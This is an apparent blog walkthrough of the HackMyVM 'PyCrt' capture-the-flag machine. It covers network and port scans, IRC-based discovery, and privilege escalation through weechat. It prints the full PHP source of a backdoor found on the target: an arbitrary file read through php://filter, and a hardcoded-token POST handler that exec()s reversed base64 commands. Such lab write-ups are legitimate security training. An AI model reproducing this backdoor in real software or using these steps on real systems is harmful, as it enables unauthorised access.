---
title: hackmyvm PyCrt靶机复盘
author: LingMj
data: 2025-05-10
categories: [hackmyvm]
tags: [irc]
description: 难度-Hard
---

## 网段扫描
```
root@LingMj:~/xxoo/jarjar# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d1:27:55, IPv4: 192.168.137.190
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.137.1	3e:21:9c:12:bd:a3	(Unknown: locally administered)
192.168.137.106	a0:78:17:62:e5:0a	Apple, Inc.
192.168.137.193	3e:21:9c:12:bd:a3	(Unknown: locally administered)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.074 seconds (123.43 hosts/sec). 3 responded
```

## 端口扫描

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-10 03:44 EDT
Nmap scan report for PyCrt.mshome.net (192.168.137.193)
Host is up (0.018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
6667/tcp open  irc
| irc-info: 
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   server: irc.local
|   version: InspIRCd-3. irc.local 
|   source ident: nmap
|   source host: 192.168.137.190
|_  error: Closing link: (nmap@192.168.137.190) [Client exited]
MAC Address: 3E:21:9C:12:BD:A3 (Unknown)
Service Info: Host: irc.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.25 seconds
```

## 获取webshell
![picture 0](../assets/images/75dc513c00a910b3f6a756d369dd8b10cf331ad85ea83bc7816ba2ee6f4f97b1.png)  

>接着需要去扫目录，不过呢这个路径是很难的，所以需要很细心才能找到，扫描目前是不行,这里推荐一个工具为weechat
>

![picture 1](../assets/images/54741e5c5175ff5283fcfeb9e3a917fa46b97670f622e78c2d72c13dcdb69270.png)  
![picture 2](../assets/images/fbd1b8d43cf055c77b5bb6ab32f5c922b16ae640f596dfb45c422bc68e263ba4.png)  

>这里可以看到一个目录
>

![picture 3](../assets/images/43ecca9495ce1c8bf4db20a45a07132b65c2fe0ff024588a408c0117f2e0c9a1.png)  

>这个页面是静态的，可以看到这里有一个很眼熟的id
>

![picture 4](../assets/images/0e2ebd3adbf7fd9f7a2214b4bdb29527e0cdbc0602f61ac02dd3646a11cc25ad.png)  

>留下这界面，一伙会有用
>

![picture 5](../assets/images/b31b9f4315a8421dfbae58b03d3cf11413b5d647f4c72c9697b62bd1ffd782c7.png)  
![picture 40](../assets/images/c8493d25bfe9e49e7e047ff0a3ab19d276623127198f94823358ba1a896d1445.png)  


>硬控半小时奥，目前没有看到最快的方案
>


![picture 6](../assets/images/6ea2f7eb8506ce72273c2ad9bcd86bca251653a839a1451070f586026a5360ab.png)  
![picture 7](../assets/images/4352296d9697bb65a4d0c91b5fb92e663965bb257c73a4227d4dbefbe343fa1f.png)  
![picture 8](../assets/images/ec743ca9d5ef17a56a3c1186293d2b01b72cb9d210bfe94f9f8a7531778bdec8.png)  
![picture 9](../assets/images/0424b5af759228e9d745b67a04248910c634915ce1ef91b2bbdaaedb1d1d2c34.png)  

```
<?php

function decrypt($input) {
    $reversed = strrev($input);
    echo "Reversed: " . $reversed . "\n";

    $decoded = base64_decode($reversed);
    echo "Decoded: " . $decoded . "\n";

    if ($decoded === false) {
        echo "Base64 decoding failed.\n";
        return false;
    }

    if (strpos($decoded, 'cmd:') === 0) {
        return substr($decoded, 4);
    }

    return false;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['file'])) {
    $file = $_GET['file'];
    if (stripos($file, 'phpinfo') !== false) {
        exit('Access Denied');
    }
    $filterUrl = 'php://filter/convert.base64-encode/resource=' . $file;
    $data = @file_get_contents($filterUrl);
    if ($data === false) {
        exit('Failed to read file');
    }
    echo base64_decode($data);
    exit;
} elseif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['auth']) && isset($_POST['payload'])) {
    $auth = $_POST['auth'];
    $payload = $_POST['payload'];

    if ($auth !== 'LetMeIn123!') {
        exit('Invalid Auth Token.');
    }

    $command = decrypt($payload);
    if ($command !== false) {
        $output = exec($command);
        echo "<pre>$output</pre>";
    } else {
        echo "Payload decode failed.\n";
    }
    exit;
} else {
    echo "Nothing to see here.";
}
?>
```

>可以看到既有get，又有post，这payload输入exec会进入一个函数处理执行命令需要cmd：而且base64，并且反转
>

>这个看起来还是很熟悉的
>

![picture 10](../assets/images/fdfa5d0bd514d1d6dbfe3423837879523e5ab1287cc3c1bf32bbae57c18f4798.png)  
![picture 11](../assets/images/9cfd0aa0ac21354699d6d8a5bf941f2a8578bd111427f4c77598edfb26305ece.png)  


## 提权

![picture 13](../assets/images/e36a083cd2852641e02411901f9e068fa963bf1caeaebdb3507402cda7fbb4a7.png)  

>这个weechat很熟悉因为就是推荐工具，哈哈哈哈
>

![picture 14](../assets/images/8d22d616a98fe3463bb9d0c79469eb50d82f7a831285aa99a8d65206f4e907d1.png)  

>可以看到有exec
>

![picture 15](../assets/images/e4cd5433d8da8c6cc9ca3d43b999847438a73d92e6623be504f369b36d86cb03.png)  
![picture 16](../assets/images/2ea58c2c6fd3e970b47f616a86066d8c7fd233acc89e5a7a14b3b6c9fd18c11b.png)  
![picture 17](../assets/images/4e09399ec1b0decb4f976fef7268ad4c4962cd0d45b3d3e70db0febabeb4c76c.png)  
![picture 18](../assets/images/871ac967c4bec7f60d90877d671f99cd9cbe30e7fae212563d1753940f132ae8.png)  

>有点问题
>

![picture 19](../assets/images/7f98ef06d22fbd72f4e43b5433704a8481678e992290c20773f8b9e00d583054.png)  

>懒得调终端
>

![picture 20](../assets/images/22be75ebe3982a06c0c0bf913a91b42a5f7c1a5d220157977e1cecd4f6165fc7.png)  
![picture 21](../assets/images/3232f80ccfa9b4121902ed94c3bbe5bc1c9e573ad15070e5ffdaf88b5b746e32.png)  
![picture 22](../assets/images/3d6a99897e33a23db7f64a52e0519afccd988b0733721e71c582dce1c782d237.png)  

>没法看只能盲测
>

![picture 23](../assets/images/40c70ed0a31628f81022d17a71cb66fe79a77fc3777a7d3d408d86a4d11694e0.png)  

>存在6个频道
>

![picture 24](../assets/images/1925432359d36bab5dceef146827ef62d337464db0695fbcf7830aa7061c6206.png)  

>在第六个频道有个提示，他说我和我的朋友在频道上聊天，这里说明在频道上需要身份才能进行聊天，这个时候会想起之前的id,当然如果你输入我的id是没有用的
>

![picture 25](../assets/images/ae4347af9c30d7110df2cd5af32a2b79e9986072e20a3c78bc2dc713eb6f2325.png)  

>可以看到3个用户id，你用上面任何一个都可以操作
>

![picture 27](../assets/images/d3c40d1c789aa2e72cbfd78203b3921e0d4aa5c677e5050180f683dd00f26f7d.png)  

![picture 26](../assets/images/0d556bc3fb46a4f38f9b9588db6d52a0fb982db8633f71595f93eb29e6dcf685.png)  

>输入命令，会说存在非法字符
>
![picture 29](../assets/images/a2e0cef00c9eecc93014024db9ab5e4dc64a879c56b773acb2b89633ec8bb8a9.png)  

![picture 28](../assets/images/99f6b6f36d5d25a77057ed3d513b648e942f6c45156bcc8a73d503662e9ed4e2.png)  
![picture 30](../assets/images/71d4dc607f72b42a5a1882cf74ac703d38dd3f896e6574b5331624fd2a28ef14.png)  
![picture 31](../assets/images/cf1bb9b95834caa78d3c8caad1796dfc99904bbef51f7f9acf32717e3a8095ce.png)  

>如何数字会出现存在不允许所以数字是突破的方式
>

![picture 32](../assets/images/5545cb24caaaf1e783b6dfa71a48e5f3c2260d8c1ed1db53e68e3e641b239080.png)  
![picture 33](../assets/images/44189ac8083d2df4fef5f2c8a533f8e03485edd803eec5319b6dcba514ba84c6.png)  

>当你在频道1输入时出现未授权，所以主要控制输入频道是频道1
>

![picture 34](../assets/images/802d717bd6b4f7896dcae9296265a1a42cac8efac1d8ee64adb17d9eb78306fd.png)  
![picture 35](../assets/images/3ebd3bc638196d1eaafeeb7e69ec2ef79cddb3275ffe39b58fec401d4b7f4600.png)  

>因为输入1的时候提到A，测试输入ascii码A的65发现会进行内容转译，说明数字输入是ascii码
>

![picture 36](../assets/images/f6059f51dface1a82454b9998132da907c7ffaa653b1331897f2e9419b2ff2f6.png)  
![picture 37](../assets/images/d9feaad8d0421642fe13613648db660f1b663165212d5dfe31fb928088fe4da5.png)  

>同样是为验证，我们可以测试其他命令比如busybox
>

![picture 38](../assets/images/9ef9118ff50e4c6cf87c99a4c70ca6d712bb19981fc0e006f856b3ce551190f3.png)  
![picture 39](../assets/images/53c4acb6e997c5b6a4915d61191da9851c5e228864f17f38691edbc5969dc156.png)  

>可以看到是能用的
>

![picture 41](../assets/images/31d71ddd43f9f185d285283d3b9a7e541e08b5bf517bff1ac3460adc6bb4e0b4.png)  

>有一个问题路径不对再来一次
>

![picture 42](../assets/images/0ba07d5ba228c2100204097ea225bee79ca5376878990c66f1861f10b764a251.png)  

>有点问题奥目前看我私钥一直不成功
>

![picture 43](../assets/images/e005c9f7157a730beb760a6c29da27afe7b71fb9238761b37957a523f731fb94.png)  

>还是很有延迟的
>

![picture 44](../assets/images/252586f8263f601d1229b6c5fb976a30ce8939ce568e4fd3a2741641e9dbc69d.png)  

>用手速去做吧，哈哈哈哈
>

![picture 45](../assets/images/7915980cbd74c66e8b6d67a1e9e978e51f4a43b509e298a55e66780b3a3fa529.png)  

>这个是可以执行tcl脚本的我当时复现都复现了很久因为主要控制虚拟界面,因此我留有一个工具去做
>

![picture 46](../assets/images/2b98ccf761c6ce39c06884c926ed43e00d2688496e7e6b3ab4214d400ada7fdc.png)  


>这样就解决了这个问题，到这里整靶场复现结束
>

>userflag:
>
>rootflag:
>